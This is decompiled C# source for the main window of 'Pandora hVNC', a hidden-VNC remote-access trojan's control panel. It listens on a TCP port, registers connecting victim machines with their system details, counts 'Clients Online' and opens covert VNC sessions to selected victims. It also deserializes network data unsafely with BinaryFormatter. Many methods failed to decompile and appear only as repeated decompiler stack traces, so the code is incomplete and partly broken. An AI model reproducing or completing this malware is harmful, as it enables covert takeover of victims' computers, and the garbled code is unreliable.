using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Threading;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic.CompilerServices;

namespace HVNC
{
	// Token: 0x02000011 RID: 17
	public partial class FrmMain : Form
	{
		// Token: 0x06000055 RID: 85 RVA: 0x0000B06C File Offset: 0x0000926C
		public FrmMain()
		{
			/*
An exception occurred when decompiling this method (06000055)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::.ctor()

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000056 RID: 86 RVA: 0x0000B0CC File Offset: 0x000092CC
		private void Listenning()
		{
			checked
			{
				try
				{
					FrmMain._clientList = new List<TcpClient>();
					FrmMain._TcpListener = new TcpListener(IPAddress.Any, Convert.ToInt32(this.ListenPort.Text));
					FrmMain._TcpListener.Start();
					FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), FrmMain._TcpListener);
				}
				catch (Exception ex)
				{
					try
					{
						if (!ex.Message.Contains("aborted"))
						{
							IEnumerator enumerator = null;
							for (;;)
							{
								try
								{
									try
									{
										foreach (object obj in Application.OpenForms)
										{
											Form form = (Form)obj;
											if (form.Name.Contains("FrmVNC"))
											{
												form.Dispose();
											}
										}
									}
									finally
									{
										if (enumerator is IDisposable)
										{
											(enumerator as IDisposable).Dispose();
										}
									}
									break;
								}
								catch (Exception)
								{
								}
							}
							FrmMain.bool_1 = false;
							this.HVNCListenBtn.Text = "Listen";
							int num = FrmMain._clientList.Count - 1;
							for (int i = 0; i <= num; i++)
							{
								FrmMain._clientList[i].Close();
							}
							FrmMain._clientList = new List<TcpClient>();
							FrmMain.int_2 = 0;
							FrmMain._TcpListener.Stop();
							this.ClientsOnline.Text = "Clients Online: 0";
						}
					}
					catch (Exception)
					{
					}
				}
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000021AC File Offset: 0x000003AC
		public static string RandomNumber(int length)
		{
			return new string((from s in Enumerable.Repeat<string>("0123456789", length)
			select s[FrmMain.random.Next(s.Length)]).ToArray<char>());
		}

		// Token: 0x06000058 RID: 88 RVA: 0x0000B248 File Offset: 0x00009448
		public void ResultAsync(IAsyncResult iasyncResult_0)
		{
			try
			{
				TcpClient tcpClient = ((TcpListener)iasyncResult_0.AsyncState).EndAcceptTcpClient(iasyncResult_0);
				tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), tcpClient);
				FrmMain._TcpListener.BeginAcceptTcpClient(new AsyncCallback(this.ResultAsync), FrmMain._TcpListener);
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x0000B2BC File Offset: 0x000094BC
		public void ReadResult(IAsyncResult iasyncResult_0)
		{
			TcpClient tcpClient = (TcpClient)iasyncResult_0.AsyncState;
			checked
			{
				try
				{
					BinaryFormatter binaryFormatter = new BinaryFormatter();
					binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
					binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
					binaryFormatter.FilterLevel = TypeFilterLevel.Full;
					byte[] array = new byte[8];
					int i = 8;
					int num = 0;
					while (i > 0)
					{
						int num2 = tcpClient.GetStream().Read(array, num, i);
						i -= num2;
						num += num2;
					}
					ulong num3 = BitConverter.ToUInt64(array, 0);
					byte[] array2 = new byte[Convert.ToInt32(decimal.Subtract(new decimal(num3), 1m)) + 1];
					using (MemoryStream memoryStream = new MemoryStream())
					{
						int num4 = 0;
						int j = array2.Length;
						while (j > 0)
						{
							int num5 = tcpClient.GetStream().Read(array2, num4, j);
							j -= num5;
							num4 += num5;
						}
						memoryStream.Write(array2, 0, (int)num3);
						memoryStream.Position = 0L;
						object objectValue = RuntimeHelpers.GetObjectValue(binaryFormatter.Deserialize(memoryStream));
						if (objectValue is string)
						{
							string[] array3 = (string[])NewLateBinding.LateGet(objectValue, null, "split", new object[]
							{
								"|"
							}, null, null, null);
							try
							{
								if (Operators.CompareString(array3[0], "54321", false) == 0)
								{
									tcpClient.Close();
								}
								if (Operators.CompareString(array3[0], "654321", false) == 0)
								{
									string str;
									try
									{
										str = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									catch
									{
										str = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address.ToString();
									}
									try
									{
										IPAddress address = ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address;
										string text = new Ping().Send(address).RoundtripTime.ToString();
										ListViewItem lvi = new ListViewItem(new string[]
										{
											" " + str,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											text
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										this.HVNCList.Invoke(new MethodInvoker(delegate()
										{
											List<TcpClient> clientList = FrmMain._clientList;
											lock (clientList)
											{
												this.HVNCList.Items.Add(lvi);
												this.HVNCList.Items[FrmMain.int_2].Selected = true;
												FrmMain._clientList.Add(tcpClient);
												FrmMain.int_2++;
												this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
												GC.Collect();
											}
										}));
										goto IL_3AC;
									}
									catch (Exception)
									{
										ListViewItem lvi = new ListViewItem(new string[]
										{
											" " + str,
											array3[1].Replace(" ", null),
											array3[3],
											array3[2],
											array3[4],
											array3[6],
											array3[5],
											array3[7],
											array3[8],
											"N/A"
										})
										{
											Tag = tcpClient,
											ImageKey = array3[3].ToString() + ".png"
										};
										this.HVNCList.Invoke(new MethodInvoker(delegate()
										{
											List<TcpClient> clientList = FrmMain._clientList;
											lock (clientList)
											{
												this.HVNCList.Items.Add(lvi);
												this.HVNCList.Items[FrmMain.int_2].Selected = true;
												FrmMain._clientList.Add(tcpClient);
												FrmMain.int_2++;
												this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
												GC.Collect();
											}
										}));
										goto IL_3AC;
									}
								}
								if (FrmMain._clientList.Contains(tcpClient))
								{
									this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
								}
								else
								{
									tcpClient.Close();
								}
								IL_3AC:
								goto IL_3E3;
							}
							catch (Exception)
							{
								goto IL_3E3;
							}
						}
						if (FrmMain._clientList.Contains(tcpClient))
						{
							this.GetStatus(RuntimeHelpers.GetObjectValue(objectValue), tcpClient);
						}
						else
						{
							tcpClient.Close();
						}
						IL_3E3:
						memoryStream.Close();
						memoryStream.Dispose();
					}
					tcpClient.GetStream().BeginRead(new byte[1], 0, 0, new AsyncCallback(this.ReadResult), tcpClient);
				}
				catch (Exception ex)
				{
					if (!ex.Message.Contains("disposed"))
					{
						try
						{
							if (FrmMain._clientList.Contains(tcpClient))
							{
								int NumberReceived;
								for (NumberReceived = Application.OpenForms.Count - 2; NumberReceived >= 0; NumberReceived += -1)
								{
									if (Application.OpenForms[NumberReceived] != null && Application.OpenForms[NumberReceived].Tag == tcpClient)
									{
										if (Application.OpenForms[NumberReceived].Visible)
										{
											base.Invoke(new MethodInvoker(delegate()
											{
												if (Application.OpenForms[NumberReceived].IsHandleCreated)
												{
													Application.OpenForms[NumberReceived].Close();
												}
											}));
										}
										else if (Application.OpenForms[NumberReceived].IsHandleCreated)
										{
											Application.OpenForms[NumberReceived].Close();
										}
									}
								}
								this.HVNCList.Invoke(new MethodInvoker(delegate()
								{
									List<TcpClient> clientList = FrmMain._clientList;
									lock (clientList)
									{
										try
										{
											int index = FrmMain._clientList.IndexOf(tcpClient);
											FrmMain._clientList.RemoveAt(index);
											this.HVNCList.Items.RemoveAt(index);
											tcpClient.Close();
											FrmMain.int_2--;
											this.ClientsOnline.Text = "Clients Online: " + Conversions.ToString(FrmMain.int_2);
										}
										catch (Exception)
										{
										}
									}
								}));
							}
							goto IL_549;
						}
						catch (Exception)
						{
							goto IL_549;
						}
					}
					tcpClient.Close();
					IL_549:;
				}
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x0000B8A8 File Offset: 0x00009AA8
		public void GetStatus(object object_2, TcpClient tcpClient_0)
		{
			/*
An exception occurred when decompiling this method (0600005A)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::GetStatus(System.Object,System.Net.Sockets.TcpClient)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x0600005B RID: 91 RVA: 0x0000BCBC File Offset: 0x00009EBC
		private void HVNCList_DoubleClick(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.HVNCList.FocusedItem.Index != -1)
					{
						for (int i = Application.OpenForms.Count - 1; i >= 0; i += -1)
						{
							if (Application.OpenForms[i].Tag == FrmMain._clientList[this.HVNCList.FocusedItem.Index])
							{
								Application.OpenForms[i].Show();
								return;
							}
						}
						FrmVNC frmVNC = new FrmVNC();
						frmVNC.Name = "VNCForm:" + Conversions.ToString(FrmMain._clientList[this.HVNCList.FocusedItem.Index].GetHashCode());
						frmVNC.Tag = FrmMain._clientList[this.HVNCList.FocusedItem.Index];
						string str = this.HVNCList.FocusedItem.SubItems[0].ToString().Replace("ListViewSubItem", null).Replace("{", null).Replace("}", null).Replace(":", null).Remove(0, 1);
						string str2 = this.HVNCList.FocusedItem.SubItems[3].ToString().Replace("ListViewSubItem", null).Replace("{", null).Replace("}", null).Replace(":", null).Remove(0, 1);
						frmVNC.Text = str + ":" + str2;
						frmVNC.ClientRecoveryLabel.Text = str + ":" + str2;
						frmVNC.Show();
					}
				}
				catch (Exception)
				{
					MessageBox.Show("You have to select a client first!", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
			}
		}

		// Token: 0x0600005C RID: 92 RVA: 0x0000BE94 File Offset: 0x0000A094
		private void HVNCList_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
		{
			/*
An exception occurred when decompiling this method (0600005C)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::HVNCList_DrawColumnHeader(System.Object,System.Windows.Forms.DrawListViewColumnHeaderEventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x0600005D RID: 93 RVA: 0x0000BEF0 File Offset: 0x0000A0F0
		private void HVNCList_DrawItem(object sender, DrawListViewItemEventArgs e)
		{
			/*
An exception occurred when decompiling this method (0600005D)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::HVNCList_DrawItem(System.Object,System.Windows.Forms.DrawListViewItemEventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x0600005E RID: 94 RVA: 0x0000BF58 File Offset: 0x0000A158
		private void HVNCList_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
		{
			/*
An exception occurred when decompiling this method (0600005E)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::HVNCList_DrawSubItem(System.Object,System.Windows.Forms.DrawListViewSubItemEventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x0600005F RID: 95 RVA: 0x0000C03C File Offset: 0x0000A23C
		private void HVNCListenBtn_Click_1(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.StatusPort.Text, "Enable Port", false) == 0)
			{
				this.StatusPort.Text = "Disable Port";
				this.HVNCListenBtn.Image = this.imageList2.Images[0];
				this.HVNCListenPort.Enabled = false;
				this.VNC_Thread = new Thread(new ThreadStart(this.Listenning))
				{
					IsBackground = true
				};
				FrmMain.bool_1 = true;
				this.VNC_Thread.Start();
				return;
			}
			IEnumerator enumerator = null;
			for (;;)
			{
				try
				{
					try
					{
						foreach (object obj in Application.OpenForms)
						{
							Form form = (Form)obj;
							if (form.Name.Contains("FrmVNC"))
							{
								form.Dispose();
							}
						}
					}
					finally
					{
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
					break;
				}
				catch (Exception)
				{
				}
			}
			this.HVNCListenPort.Enabled = true;
			this.VNC_Thread.Abort();
			FrmMain.bool_1 = false;
			this.StatusPort.Text = "Enable Port";
			this.HVNCListenBtn.Image = this.imageList2.Images[1];
			this.HVNCList.Items.Clear();
			FrmMain._TcpListener.Stop();
			checked
			{
				int num = FrmMain._clientList.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					FrmMain._clientList[i].Close();
				}
				FrmMain._clientList = new List<TcpClient>();
				FrmMain.int_2 = 0;
				this.ClientsOnline.Text = "Clients Online: 0";
			}
		}

		// Token: 0x06000060 RID: 96 RVA: 0x00007B88 File Offset: 0x00005D88
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000060)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::Form1_FormClosing(System.Object,System.Windows.Forms.FormClosingEventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000061 RID: 97 RVA: 0x0000C1EC File Offset: 0x0000A3EC
		private void FrmMain_Load(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000061)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::FrmMain_Load(System.Object,System.EventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
